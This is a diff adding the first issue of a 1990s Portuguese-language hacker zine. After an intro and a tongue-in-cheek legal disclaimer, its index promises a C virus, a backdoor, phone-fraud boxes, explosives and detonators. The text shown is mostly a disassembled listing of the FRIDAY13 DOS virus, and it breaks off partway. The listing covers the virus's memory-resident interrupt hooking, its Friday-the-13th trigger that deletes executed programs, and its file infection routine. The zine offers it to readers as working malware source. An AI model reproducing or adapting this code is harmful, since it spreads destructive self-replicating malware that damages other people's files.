@@ -1,0 +1,1964 @@
+___________________________________________________________________________________
+
+
+
+    ▓▓▓▓▓▓▓▓▓▓▓▓   ▓▓         ▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓▓▓  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+    ▓▓        ▓▓   ▓▓         ▓▓          ▓▓      ▓▓        ▓▓
+    ▓▓        ▓▓   ▓▓         ▓▓          ▓▓      ▓▓        ▓▓
+    ▓▓        ▓▓   ▓▓         ▓▓▓▓▓▓▓     ▓▓▓▓▓▓▓▓▓▓        ▓▓
+    ▓▓▓▓▓▓▓▓▓▓▓▓   ▓▓         ▓▓          ▓▓▓▓              ▓▓
+    ▓▓        ▓▓   ▓▓         ▓▓          ▓▓  ▓▓            ▓▓
+    ▓▓        ▓▓   ▓▓▓▓▓▓▓▓   ▓▓▓▓▓▓▓▓▓▓  ▓▓    ▓▓          ▓▓
+                                                  ▓▓
+
+
+                         Zine
+
+
+ funboy_66@hotmail.com                      
+
+    
+-----------------------------------------------------------------------------------
+
+Well, esse é o nosso primeiro Zine entao nos nem vamos mandar muita coisa..
+vai meio fraquinho!! ehhe..Esse zine aqui é mais tecnico..N0s nao dizemos
+muito como fazer isso e aquilo...Para que vc possa aprender e tirar suas
+proprias conclusoes..hehehe..( eu coloquei esse nome no zine pq era um jornal
+comunista!! e pa!! e a hlera q fazia essa jornal tao tudo preso..ou ja
+morreram!! ehhe )
+
+Obs: "Nao sou a favor de qualquer coisa que implique em quebrar a lei. O
+material presente no zine tem o intuito de informar..Cada pessoa é responsavel
+pelos seus atos..Ahhh e tem Liberdade de Expressao..e assim vai!!eheh"
+
+Obs2: NAO SEJA LAMER!!! Tente, invente, Hackeie DIFERENTE!! hehe ;)
+-----------------------------------------------------------------------------------
+-----------------------------------------------------------------------------------
+                                    INDICE
+1-INTRODUCAO
+
+ 2-VIRUS
+ |_____List do virus FRIDAY13 e Informacoes gerais
+  |_____BBS de virus na Argentina
+   |_______Virus em C
+  3-Faca seu proprio BACKDOOR
+
+    4-Boxes
+    |____Descricoes
+     |_____Busy B0x
+      |_____Black B0x
+
+       5- Anarchy
+          |____Equivalencia Quimica
+           |______BomBz
+             |_____ DeT0NaD0r
+               |____ Gas do Riso
+           6- Phreaking
+              |___Conceitos basicos sobre telefonia
+               |_____ Ligacao sem pagar usando um DIODO
+                 |_____Ligacao sem pagar usando um telefone comu
+======================================================================================================================
+1-Introducao!!
+Bom hlera!! esse é o meu primeiro zine!!! escrevi ele praticamente sozinho!!
+eheh   agora sao 03:40 da manha!! e eu to com sono!! e deixei isso por ultimo.
+Como é o meu primeiro zine peguem leve!! Ahhh c allguem quiser ajudar!!heh
+a destrubuir!! ou escrever algo!! sei lah!! ehhe ve la no final!! 
+
+
+2- VIRUS
+
+    O list do virus FRIDAY13, na proxima edicao eu mando o List do virus
+   MICHELANGELO..
+  Informacoes gerais sobre este virus!!
+  Virus FRIDAY 13th
+  Este virus de arquivo possui 1808 bytes. Infecta arquivos .COM .EXE assim
+  como arquivos de superposicao.
+  Permanece residente na memoria.
+  Os efeitos colaterais.hehe..incluem corrupcao de arquivos e arquivos de
+  superposicao, e alteracao no funcionamento do sistema!!
+  That'z all folK'z!!hehe
+  
+ (Agradecimentos no final do zine)
+======================================================================================================================
+      FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 1
+
+  
+				PAGE  60,132
+  
+				;██████████████████████████████████████████████████████████████████████████
+				;██								         ██
+				;██			        FRIDAY13			         ██
+				;██								         ██
+                                ;██      Created:   1-Jan-93                                             ██
+				;██								         ██
+				;██████████████████████████████████████████████████████████████████████████
+  
+				.286c
+  
+     = 002C			DATA_1E		EQU	2CH				; (0000:002C=6FH)
+     = 0043			DATA_2E		EQU	43H				; (3E00:0043=0DCDCH)
+     = 0045			DATA_3E		EQU	45H				; (3E00:0045=0DCDCH)
+     = 0047			DATA_4E		EQU	47H				; (3E00:0047=0DCDCH)
+     = 0049			DATA_5E		EQU	49H				; (3E00:0049=0DCDCH)
+     = 0051			DATA_6E		EQU	51H				; (3E00:0051=0DCDCH)
+     = 0053			DATA_7E		EQU	53H				; (3E00:0053=0DCDCH)
+     = 0057			DATA_8E		EQU	57H				; (3E00:0057=0DCDCH)
+     = 005D			DATA_9E		EQU	5DH				; (3E00:005D=0A0CH)
+     = 005F			DATA_10E	EQU	5FH				; (3E00:005F=0A0AH)
+     = 0061			DATA_11E	EQU	61H				; (3E00:0061=4150H)
+     = 0063			DATA_12E	EQU	63H				; (3E00:0063=4547H)
+     = 0065			DATA_13E	EQU	65H				; (3E00:0065=2020H)
+     = 0078			DATA_14E	EQU	78H				; (3E00:0078=0DBDBH)
+     = 007A			DATA_15E	EQU	7AH				; (3E00:007A=0DBDBH)
+     = 007C			DATA_16E	EQU	7CH				; (3E00:007C=0DBDBH)
+     = 007E			DATA_17E	EQU	7EH				; (3E00:007E=0DBDBH)
+     = 000A			DATA_19E	EQU	0AH				; (8595:000A=0)
+     = 000C			DATA_20E	EQU	0CH				; (8595:000C=0)
+     = 000E			DATA_21E	EQU	0EH				; (8595:000E=0)
+     = 000F			DATA_22E	EQU	0FH				; (8595:000F=0)
+     = 0011			DATA_23E	EQU	11H				; (8595:0011=0)
+     = 0013			DATA_24E	EQU	13H				; (8595:0013=0)
+     = 0015			DATA_25E	EQU	15H				; (8595:0015=0)
+     = 0017			DATA_26E	EQU	17H				; (8595:0017=0)
+     = 0019			DATA_27E	EQU	19H				; (8595:0019=0)
+     = 001B			DATA_28E	EQU	1BH				; (8595:001B=0)
+     = 001D			DATA_29E	EQU	1DH				; (8595:001D=0)
+     = 001F			DATA_30E	EQU	1FH				; (8595:001F=0)
+     = 0029			DATA_31E	EQU	29H				; (8595:0029=0)
+     = 002B			DATA_32E	EQU	2BH				; (8595:002B=0)
+     = 002D			DATA_33E	EQU	2DH				; (8595:002D=0)
+     = 002F			DATA_34E	EQU	2FH				; (8595:002F=0)
+     = 0031			DATA_35E	EQU	31H				; (8595:0031=0)
+     = 0033			DATA_36E	EQU	33H				; (8595:0033=0)
+     = 004E			DATA_37E	EQU	4EH				; (8595:004E=0)
+     = 0070			DATA_38E	EQU	70H				; (8595:0070=0)
+     = 0072			DATA_39E	EQU	72H				; (8595:0072=0)
+     = 0074			DATA_40E	EQU	74H				; (8595:0074=0)
+     = 0076			DATA_41E	EQU	76H				; (8595:0076=0)
+     = 007A			DATA_42E	EQU	7AH				; (8595:007A=0)
+     = 0080			DATA_43E	EQU	80H				; (8595:0080=0)
+     = 0082			DATA_44E	EQU	82H				; (8595:0082=0)
+     = 008F			DATA_45E	EQU	8FH				; (8595:008F=0)
+  
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 2
+
+				CODESEG		SEGMENT
+						ASSUME	CS:CODESEG, DS:CODESEG
+  
+  
+						ORG	100h
+  
+				FRIDAY13	PROC	FAR
+  
+8595:0100			start:
+8595:0100  E9 0092				JMP	LOC_3
+8595:0103  73 55 4D 73 44 6F			DB	73H, 55H, 4DH, 73H, 44H, 6FH
+8595:0109  73 00 01 9C 0D 00			DB	73H, 0, 1, 9CH, 0DH, 0
+8595:010F  00 00 04 00 AA 00			DB	0, 0, 4, 0, 0AAH, 0
+8595:0115  6E 0B 60 14 26 02			DB	6EH, 0BH, 60H, 14H, 26H, 2
+8595:011B  56 05 3C 0C 55 66			DB	56H, 5, 3CH, 0CH, 55H, 66H
+8595:0121  00 00 00 00 00 00			DB	0, 0, 0, 0, 0, 0
+8595:0127  00 00 00 00 00 00			DB	0, 0, 0, 0, 0, 0
+8595:012D  00 E8 06 53 1F 0D			DB	0, 0E8H, 6, 53H, 1FH, 0DH
+8595:0133  80 00 00 00 80 00			DB	80H, 0, 0, 0, 80H, 0
+8595:0139  1F 0D 5C 00 1F 0D			DB	1FH, 0DH, 5CH, 0, 1FH, 0DH
+8595:013F  6C 00 1F 0D 10 07			DB	6CH, 0, 1FH, 0DH, 10H, 7
+8595:0145  EA 08 C5 00 EA 08			DB	0EAH, 8, 0C5H, 0, 0EAH, 8
+8595:014B  00 F0 46 00 4D 5A			DB	0, 0F0H, 46H, 0, 4DH, 5AH
+8595:0151  C0 00 50 00 04 00			DB	0C0H, 0, 50H, 0, 4, 0
+8595:0157  20 00 11 00 FF FF			DB	20H, 0, 11H, 0, 0FFH, 0FFH
+8595:015D  5B 09 10 07 84 19			DB	5BH, 9, 10H, 7, 84H, 19H
+8595:0163  C5 00 5B 09 1E 00			DB	0C5H, 0, 5BH, 9, 1EH, 0
+8595:0169  00 00 21 42 01 2F			DB	0, 0, 21H, 42H, 1, 2FH
+8595:016F  0D 05 00 20 00 21			DB	0DH, 5, 0, 20H, 0, 21H
+8595:0175  00 E1 00				DB	0, 0E1H, 0
+  
+8595:0178			LOCLOOP_2:
+8595:0178  00 02				ADD	[BP+SI],AL
+8595:017A  10 00				ADC	[BX+SI],AL
+8595:017C  B0 97				MOV	AL,97H
+8595:017E  00 00				ADD	[BX+SI],AL
+8595:0180  B9 EA41				MOV	CX,0EA41H
+8595:0183  98					CBW					; Convrt byte to word
+8595:0184  43					INC	BX
+8595:0185  4F					DEC	DI
+8595:0186  4D					DEC	BP
+8595:0187  4D					DEC	BP
+8595:0188  41					INC	CX
+8595:0189  4E					DEC	SI
+8595:018A  44					INC	SP
+8595:018B  2E					DB	2EH				; CS:
+8595:018C  43					INC	BX
+8595:018D  4F					DEC	DI
+8595:018E  4D					DEC	BP
+8595:018F  01 00				ADD	[BX+SI],AX
+8595:0191  00 00				ADD	[BX+SI],AL
+8595:0193  00 00				ADD	[BX+SI],AL
+8595:0195			LOC_3:							;  xref 8595:0100
+8595:0195  FC					CLD					; Clear direction
+8595:0196  B4 E0				MOV	AH,0E0H
+8595:0198  CD 21				INT	21H				; DOS Services  ah=function E0h
+8595:019A  80 FC E0				CMP	AH,0E0H
+8595:019D  73 16				JAE	LOC_4				; Jump if above or =
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 3
+
+8595:019F  80 FC 03				CMP	AH,3
+8595:01A2  72 11				JB	LOC_4				; Jump if below
+8595:01A4  B4 DD				MOV	AH,0DDH
+8595:01A6  BF 0100				MOV	DI,100H
+8595:01A9  BE 0710				MOV	SI,710H
+8595:01AC  03 F7				ADD	SI,DI
+8595:01AE  2E:8B 8D 0011			MOV	CX,CS:[DI+11H]
+8595:01B3  CD 21				INT	21H				; DOS Services  ah=function DDh
+8595:01B5			LOC_4:							;  xref 8595:019D, 01A2
+8595:01B5  8C C8				MOV	AX,CS
+8595:01B7  05 0010				ADD	AX,10H
+8595:01BA  8E D0				MOV	SS,AX
+8595:01BC  BC 0700				MOV	SP,700H
+8595:01BF  50					PUSH	AX
+8595:01C0  B8 00C5				MOV	AX,0C5H
+8595:01C3  50					PUSH	AX
+8595:01C4  CB					RET					; Return far
+8595:01C5  FC 06 2E 8C 06 31			DB	0FCH, 6, 2EH, 8CH, 6, 31H
+8595:01CB  00 2E 8C 06 39 00			DB	0, 2EH, 8CH, 6, 39H, 0
+8595:01D1  2E 8C 06 3D 00 2E			DB	2EH, 8CH, 6, 3DH, 0, 2EH
+8595:01D7  8C 06 41 00 8C C0			DB	8CH, 6, 41H, 0, 8CH, 0C0H
+8595:01DD  05 10 00 2E 01 06			DB	5, 10H, 0, 2EH, 1, 6
+8595:01E3  49 00 2E 01 06 45			DB	49H, 0, 2EH, 1, 6, 45H
+8595:01E9  00 B4 E0 CD 21 80			DB	0, 0B4H, 0E0H, 0CDH, 21H, 80H
+8595:01EF  FC E0 73 13 80 FC			DB	0FCH, 0E0H, 73H, 13H, 80H, 0FCH
+8595:01F5  03 07 2E 8E 16 45			DB	3, 7, 2EH, 8EH, 16H, 45H
+8595:01FB  00 2E 8B 26 43 00			DB	0, 2EH, 8BH, 26H, 43H, 0
+8595:0201  2E FF 2E 47 00 33			DB	2EH, 0FFH, 2EH, 47H, 0, 33H
+8595:0207  C0 8E C0 26 A1 FC			DB	0C0H, 8EH, 0C0H, 26H, 0A1H, 0FCH
+8595:020D  03 2E A3 4B 00 26			DB	3, 2EH, 0A3H, 4BH, 0, 26H
+8595:0213  A0 FE 03 2E A2 4D			DB	0A0H, 0FEH, 3, 2EH, 0A2H, 4DH
+8595:0219  00					DB	0
+8595:021A  26					DB	26H
+  
+				;██████████████████████████████████████████████████████████████████████████
+				;
+				;			External Entry Point
+				;
+				;██████████████████████████████████████████████████████████████████████████
+  
+8595:021B			int_24h_entry	PROC	FAR
+8595:021B  C7 06 03FC A5F3			MOV	DATA_46,0A5F3H			; (8595:03FC=29H)
+8595:0221  26:C6 06 03FE CB			MOV	ES:DATA_47,0CBH			; (8595:03FE=2EH)
+8595:0227  58					POP	AX
+8595:0228  05 0010				ADD	AX,10H
+8595:022B  8E C0				MOV	ES,AX
+8595:022D  0E					PUSH	CS
+8595:022E  1F					POP	DS
+8595:022F  B9 0710				MOV	CX,710H
+8595:0232  D1 E9				SHR	CX,1				; Shift w/zeros fill
+8595:0234  33 F6				XOR	SI,SI				; Zero register
+8595:0236  8B FE				MOV	DI,SI
+8595:0238  06					PUSH	ES
+8595:0239  B8 0142				MOV	AX,142H
+8595:023C  50					PUSH	AX
+8595:023D  EA 0000:03FC				JMP	FAR PTR LOC_1
+8595:0242  8C C8 8E D0 BC 00			DB	8CH, 0C8H, 8EH, 0D0H, 0BCH, 0
+8595:0248  07 33 C0 8E D8 2E			DB	7, 33H, 0C0H, 8EH, 0D8H, 2EH
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 4
+
+8595:024E  A1 4B 00 A3 FC 03			DB	0A1H, 4BH, 0, 0A3H, 0FCH, 3
+8595:0254  2E A0 4D 00 A2 FE			DB	2EH, 0A0H, 4DH, 0, 0A2H, 0FEH
+8595:025A  03					DB	3
+				int_24h_entry	ENDP
+  
+  
+				;██████████████████████████████████████████████████████████████████████████
+				;
+				;			External Entry Point
+				;
+				;██████████████████████████████████████████████████████████████████████████
+  
+8595:025B			int_21h_entry	PROC	FAR
+8595:025B  8B DC				MOV	BX,SP
+8595:025D  B1 04				MOV	CL,4
+8595:025F  D3 EB				SHR	BX,CL				; Shift w/zeros fill
+8595:0261  83 C3 10				ADD	BX,10H
+8595:0264  2E:89 1E 0033			MOV	CS:DATA_36E,BX			; (8595:0033=0)
+8595:0269  B4 4A				MOV	AH,4AH				; 'J'
+8595:026B  2E:8E 06 0031			MOV	ES,CS:DATA_35E			; (8595:0031=0)
+8595:0270  CD 21				INT	21H				; DOS Services  ah=function 4Ah
+											;  change mem allocation, bx=siz
+8595:0272  B8 3521				MOV	AX,3521H
+8595:0275  CD 21				INT	21H				; DOS Services  ah=function 35h
+											;  get intrpt vector al in es:bx
+8595:0277  2E:89 1E 0017			MOV	CS:DATA_26E,BX			; (8595:0017=0)
+8595:027C  2E:8C 06 0019			MOV	CS:DATA_27E,ES			; (8595:0019=0)
+8595:0281  0E					PUSH	CS
+8595:0282  1F					POP	DS
+8595:0283  BA 025B				MOV	DX,25BH
+8595:0286  B8 2521				MOV	AX,2521H
+8595:0289  CD 21				INT	21H				; DOS Services  ah=function 25h
+											;  set intrpt vector al to ds:dx
+8595:028B  8E 06 0031				MOV	ES,DS:DATA_35E			; (8595:0031=0)
+8595:028F  26:8E 06 002C			MOV	ES,ES:DATA_1E			; (0000:002C=6FH)
+8595:0294  33 FF				XOR	DI,DI				; Zero register
+8595:0296  B9 7FFF				MOV	CX,7FFFH
+8595:0299  32 C0				XOR	AL,AL				; Zero register
+  
+8595:029B			LOCLOOP_5:						;  xref 8595:02A0
+8595:029B  F2/AE				REPNE	SCASB				; Rept zf=0+cx>0 Scan es:[di] for al
+8595:029D  26:38 05				CMP	ES:[DI],AL
+8595:02A0  E0 F9				LOOPNZ	LOCLOOP_5			; Loop if zf=0, cx>0
+  
+8595:02A2  8B D7				MOV	DX,DI
+8595:02A4  83 C2 03				ADD	DX,3
+8595:02A7  B8 4B00				MOV	AX,4B00H
+8595:02AA  06					PUSH	ES
+8595:02AB  1F					POP	DS
+8595:02AC  0E					PUSH	CS
+8595:02AD  07					POP	ES
+8595:02AE  BB 0035				MOV	BX,35H
+8595:02B1  1E					PUSH	DS
+8595:02B2  06					PUSH	ES
+8595:02B3  50					PUSH	AX
+8595:02B4  53					PUSH	BX
+8595:02B5  51					PUSH	CX
+8595:02B6  52					PUSH	DX
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 5
+
+8595:02B7  B4 2A				MOV	AH,2AH				; '*'
+8595:02B9  CD 21				INT	21H				; DOS Services  ah=function 2Ah
+											;  get date, cx=year, dx=mon/day
+8595:02BB  2E:C6 06 000E 00			MOV	BYTE PTR CS:DATA_21E,0		; (8595:000E=0)
+8595:02C1  81 F9 07C3				CMP	CX,7C3H
+8595:02C5  74 30				JE	LOC_7				; Jump if equal
+8595:02C7  3C 05				CMP	AL,5
+8595:02C9  75 0D				JNE	LOC_6				; Jump if not equal
+8595:02CB  80 FA 0D				CMP	DL,0DH
+8595:02CE  75 08				JNE	LOC_6				; Jump if not equal
+8595:02D0  2E:FE 06 000E			INC	BYTE PTR CS:DATA_21E		; (8595:000E=0)
+8595:02D5  EB 20				JMP	SHORT LOC_7
+8595:02D7  90					DB	90H
+8595:02D8			LOC_6:							;  xref 8595:02C9, 02CE
+8595:02D8  B8 3508				MOV	AX,3508H
+8595:02DB  CD 21				INT	21H				; DOS Services  ah=function 35h
+											;  get intrpt vector al in es:bx
+8595:02DD  2E:89 1E 0013			MOV	CS:DATA_24E,BX			; (8595:0013=0)
+8595:02E2  2E:8C 06 0015			MOV	CS:DATA_25E,ES			; (8595:0015=0)
+8595:02E7  0E					PUSH	CS
+8595:02E8  1F					POP	DS
+8595:02E9  C7 06 001F 7E90			MOV	WORD PTR DS:DATA_30E,7E90H	; (8595:001F=0)
+8595:02EF  B8 2508				MOV	AX,2508H
+8595:02F2  BA 021E				MOV	DX,21EH
+8595:02F5  CD 21				INT	21H				; DOS Services  ah=function 25h
+											;  set intrpt vector al to ds:dx
+8595:02F7			LOC_7:							;  xref 8595:02C5, 02D5
+8595:02F7  5A					POP	DX
+8595:02F8  59					POP	CX
+8595:02F9  5B					POP	BX
+8595:02FA  58					POP	AX
+8595:02FB  07					POP	ES
+8595:02FC  1F					POP	DS
+8595:02FD  9C					PUSHF					; Push flags
+8595:02FE  2E:FF 1E 0017			CALL	DWORD PTR CS:DATA_26E		; (8595:0017=0)
+8595:0303  1E					PUSH	DS
+8595:0304  07					POP	ES
+8595:0305  B4 49				MOV	AH,49H				; 'I'
+8595:0307  CD 21				INT	21H				; DOS Services  ah=function 49h
+											;  release memory block, es=seg
+8595:0309  B4 4D				MOV	AH,4DH				; 'M'
+8595:030B  CD 21				INT	21H				; DOS Services  ah=function 4Dh
+											;  get return code info in ax
+8595:030D  B4 31				MOV	AH,31H				; '1'
+8595:030F  BA 0600				MOV	DX,600H
+8595:0312  B1 04				MOV	CL,4
+8595:0314  D3 EA				SHR	DX,CL				; Shift w/zeros fill
+8595:0316  83 C2 10				ADD	DX,10H
+8595:0319  CD 21				INT	21H				; DOS Services  ah=function 31h
+											;  terminate & stay resident
+8595:031B  32 C0 CF 2E 83 3E			DB	32H, 0C0H, 0CFH, 2EH, 83H, 3EH
+8595:0321  1F 00 02 75 17 50			DB	1FH, 0, 2, 75H, 17H, 50H
+8595:0327  53 51 52 55 B8 02			DB	53H, 51H, 52H, 55H, 0B8H, 2
+8595:032D  06 B7 87 B9 05 05			DB	6, 0B7H, 87H, 0B9H, 5, 5
+8595:0333  BA 10 10 CD 10 5D			DB	0BAH, 10H, 10H, 0CDH, 10H, 5DH
+8595:0339  5A 59 5B 58 2E FF			DB	5AH, 59H, 5BH, 58H, 2EH, 0FFH
+8595:033F  0E 1F 00 75 12 2E			DB	0EH, 1FH, 0, 75H, 12H, 2EH
+8595:0345  C7 06 1F 00 01 00			DB	0C7H, 6, 1FH, 0, 1, 0
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 6
+
+8595:034B  50 51 56 B9 01 40			DB	50H, 51H, 56H, 0B9H, 1, 40H
+8595:0351  F3 AC 5E 59 58 2E			DB	0F3H, 0ACH, 5EH, 59H, 58H, 2EH
+8595:0357  FF 2E 13 00 9C 80			DB	0FFH, 2EH, 13H, 0, 9CH, 80H
+8595:035D  FC E0 75 05 B8 00			DB	0FCH, 0E0H, 75H, 5, 0B8H, 0
+8595:0363  03 9D CF 80 FC DD			DB	3, 9DH, 0CFH, 80H, 0FCH, 0DDH
+8595:0369  74 13 80 FC DE 74			DB	74H, 13H, 80H, 0FCH, 0DEH, 74H
+8595:036F  28 3D 00 4B 75 03			DB	28H, 3DH, 0, 4BH, 75H, 3
+8595:0375  E9 B4 00				DB	0E9H, 0B4H, 0
+8595:0378			LOC_8:
+8595:0378  9D					POPF					; Pop flags
+8595:0379  2E:FF 2E 0017			JMP	DWORD PTR CS:DATA_26E		; (8595:0017=0)
+8595:037E			LOC_9:
+8595:037E  58					POP	AX
+8595:037F  58					POP	AX
+8595:0380  B8 0100				MOV	AX,100H
+8595:0383  2E:A3 000A				MOV	CS:DATA_19E,AX			; (8595:000A=0)
+8595:0387  58					POP	AX
+8595:0388  2E:A3 000C				MOV	CS:DATA_20E,AX			; (8595:000C=0)
+8595:038C  F3/A4				REP	MOVSB				; Rep while cx>0 Mov [si] to es:[di]
+8595:038E  9D					POPF					; Pop flags
+8595:038F  2E:A1 000F				MOV	AX,CS:DATA_22E			; (8595:000F=0)
+8595:0393  2E:FF 2E 000A			JMP	DWORD PTR CS:DATA_19E		; (8595:000A=0)
+8595:0398			LOC_10:
+8595:0398  83 C4 06				ADD	SP,6
+8595:039B  9D					POPF					; Pop flags
+8595:039C  8C C8				MOV	AX,CS
+8595:039E  8E D0				MOV	SS,AX
+8595:03A0  BC 0710				MOV	SP,710H
+8595:03A3  06					PUSH	ES
+8595:03A4  06					PUSH	ES
+8595:03A5  33 FF				XOR	DI,DI				; Zero register
+8595:03A7  0E					PUSH	CS
+8595:03A8  07					POP	ES
+8595:03A9  B9 0010				MOV	CX,10H
+8595:03AC  8B F3				MOV	SI,BX
+8595:03AE  BF 0021				MOV	DI,21H
+8595:03B1  F3/A4				REP	MOVSB				; Rep while cx>0 Mov [si] to es:[di]
+8595:03B3  8C D8				MOV	AX,DS
+8595:03B5  8E C0				MOV	ES,AX
+8595:03B7  2E:F7 26 007A			MUL	WORD PTR CS:DATA_42E		; (8595:007A=0) ax = data * ax
+8595:03BC  2E:03 06 002B			ADD	AX,CS:DATA_32E			; (8595:002B=0)
+8595:03C1  83 D2 00				ADC	DX,0
+8595:03C4  2E:F7 36 007A			DIV	WORD PTR CS:DATA_42E		; (8595:007A=0) ax,dxrem=dx:ax/data
+8595:03C9  8E D8				MOV	DS,AX
+8595:03CB  8B F2				MOV	SI,DX
+8595:03CD  8B FA				MOV	DI,DX
+8595:03CF  8C C5				MOV	BP,ES
+8595:03D1  2E:8B 1E 002F			MOV	BX,CS:DATA_34E			; (8595:002F=0)
+8595:03D6  0B DB				OR	BX,BX				; Zero ?
+8595:03D8  74 13				JZ	LOC_12				; Jump if zero
+8595:03DA			LOC_11:							;  xref 8595:03EB
+8595:03DA  B9 8000				MOV	CX,8000H
+8595:03DD  F3/A5				REP	MOVSW				; Rep while cx>0 Mov [si] to es:[di]
+8595:03DF  05 1000				ADD	AX,1000H
+8595:03E2  81 C5 1000				ADD	BP,1000H
+8595:03E6  8E D8				MOV	DS,AX
+8595:03E8  8E C5				MOV	ES,BP
+8595:03EA  4B					DEC	BX
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 7
+
+8595:03EB  75 ED				JNZ	LOC_11				; Jump if not zero
+8595:03ED			LOC_12:							;  xref 8595:03D8
+8595:03ED  2E:8B 0E 002D			MOV	CX,CS:DATA_33E			; (8595:002D=0)
+8595:03F2  F3/A4				REP	MOVSB				; Rep while cx>0 Mov [si] to es:[di]
+8595:03F4  58					POP	AX
+8595:03F5  50					PUSH	AX
+8595:03F6  05 0010				ADD	AX,10H
+8595:03F9  2E:01 06 0029			ADD	CS:DATA_31E,AX			; (8595:0029=0)
+8595:03FE  2E			DATA_47		DB	2EH				;  xref 8595:0222
+8595:03FF  01 06 25 00 2E A1			DB	1, 6, 25H, 0, 2EH, 0A1H
+8595:0405  21 00 1F 07 2E 8E			DB	21H, 0, 1FH, 7, 2EH, 8EH
+8595:040B  16 29 00 2E 8B 26			DB	16H, 29H, 0, 2EH, 8BH, 26H
+8595:0411  27 00 2E FF 2E 23			DB	27H, 0, 2EH, 0FFH, 2EH, 23H
+8595:0417  00					DB	0
+8595:0418			LOC_13:							;  xref 8595:0432
+8595:0418  33 C9				XOR	CX,CX				; Zero register
+8595:041A  B8 4301				MOV	AX,4301H
+8595:041D  CD 21				INT	21H				; DOS Services  ah=function 43h
+											;  get/set file attrb, nam@ds:dx
+8595:041F  B4 41				MOV	AH,41H				; 'A'
+8595:0421  CD 21				INT	21H				; DOS Services  ah=function 41h
+											;  delete file, name @ ds:dx
+8595:0423  B8 4B00				MOV	AX,4B00H
+8595:0426  9D					POPF					; Pop flags
+8595:0427  2E:FF 2E 0017			JMP	DWORD PTR CS:DATA_26E		; (8595:0017=0)
+8595:042C			LOC_14:
+8595:042C  2E:80 3E 000E 01			CMP	BYTE PTR CS:DATA_21E,1		; (8595:000E=0)
+8595:0432  74 E4				JE	LOC_13				; Jump if equal
+8595:0434  2E:C7 06 0070 FFFF			MOV	WORD PTR CS:DATA_38E,0FFFFH	; (8595:0070=0)
+8595:043B  2E:C7 06 008F 0000			MOV	WORD PTR CS:DATA_45E,0		; (8595:008F=0)
+8595:0442  2E:89 16 0080			MOV	CS:DATA_43E,DX			; (8595:0080=0)
+8595:0447  2E:8C 1E 0082			MOV	CS:DATA_44E,DS			; (8595:0082=0)
+8595:044C  50					PUSH	AX
+8595:044D  53					PUSH	BX
+8595:044E  51					PUSH	CX
+8595:044F  52					PUSH	DX
+8595:0450  56					PUSH	SI
+8595:0451  57					PUSH	DI
+8595:0452  1E					PUSH	DS
+8595:0453  06					PUSH	ES
+8595:0454  FC					CLD					; Clear direction
+8595:0455  8B FA				MOV	DI,DX
+8595:0457  32 D2				XOR	DL,DL				; Zero register
+8595:0459  80 7D 01 3A				CMP	BYTE PTR [DI+1],3AH		; ':'
+8595:045D  75 05				JNE	LOC_15				; Jump if not equal
+8595:045F  8A 15				MOV	DL,[DI]
+8595:0461  80 E2 1F				AND	DL,1FH
+8595:0464			LOC_15:							;  xref 8595:045D
+8595:0464  B4 36				MOV	AH,36H				; '6'
+8595:0466  CD 21				INT	21H				; DOS Services  ah=function 36h
+											;  get free space, drive dl,1=a:
+8595:0468  3D FFFF				CMP	AX,0FFFFH
+8595:046B  75 03				JNE	LOC_17				; Jump if not equal
+8595:046D			LOC_16:							;  xref 8595:047B
+8595:046D  E9 0277				JMP	LOC_43
+8595:0470			LOC_17:							;  xref 8595:046B
+8595:0470  F7 E3				MUL	BX				; dx:ax = reg * ax
+8595:0472  F7 E1				MUL	CX				; dx:ax = reg * ax
+     FRIDAY13.lst    TA FEIRA 13 (O VIRUS)		 Sourcer Listing v1.70        8-May-93	  6:32 pm       Page 8
+
+8595:0474  0B D2				OR	DX,DX				; Zero ?
+8595:0476  75 05				JNZ	LOC_18				; Jump if not zero
+8595:0478  3D 0710				CMP	AX,710H
+8595:047B  72 F0				JB	LOC_16				; Jump if below
+8595:047D			LOC_18:							;  xref 8595:0476
+8595:047D  2E:8B 16 0080			MOV	DX,CS:DATA_43E			; (8595:0080=0)
+8595:0482  1E					PUSH	DS
+8595:0483  07					POP	ES
+8595:0484  32 C0				XOR	AL,AL				; Zero register
+8595:0486  B9 0041				MOV	CX,41H
+8595:0489  F2/AE				REPNE	SCASB				; Rept zf=0+cx>0 Scan es:[di] for al
+8595:048B  2E:8B 36 0080			MOV	SI,CS:DATA_43E			; (8595:0080=0)
+8595:0490			LOC_19:							;  xref 8595:04A2
+8595:0490  8A 04				MOV	AL,[SI]
+8595:0492  0A C0				OR	AL,AL				; Zero ?
+8595:0494  74 0E				JZ	LOC_21				; Jump if zero
+8595:0496  3C 61				CMP	AL,61H				; 'a'
+8595:0498  72 07				JB	LOC_20				; Jump if below
+8595:049A  3C 7A				CMP	AL,7AH				; 'z'
+8595:049C  77 03				JA	LOC_20				; Jump if above
+8595:049E  80 2C 20				SUB	BYTE PTR [SI],20H		; ' '
+8595:04A1			LOC_20:							;  xref 8595:0498, 049C
+8595:04A1  46					INC	SI
+8595:04A2  EB EC				JMP	SHORT LOC_19
+8595:04A4			LOC_21:							;  xref 8595:0494
+8595:04A4  B9 000B				MOV	CX,0BH
+8595:04A7  2B F1				SUB	SI,CX
+8595:04A9  BF 0084				MOV	DI,84H
+8595:04AC  0E					PUSH	CS
+8595:04AD  07					POP	ES
+8595:04AE  B9 000B				MOV	CX,0BH
+8595:04B1  F3/A6				REPE	CMPSB				; Rept zf=1+cx>0 Cmp [si] to es:[di]
+8595:04B3  75 03				JNZ	LOC_22				; Jump if not zero
+8595:04B5  E9 022F				JMP	LOC_43
+8595:04B8			LOC_22:							;  xref 8595:04B3
+8595:04B8  B8 4300				MOV	AX,4300H
+8595:04BB  CD 21				INT	21H				; DOS Services  ah=function 43h
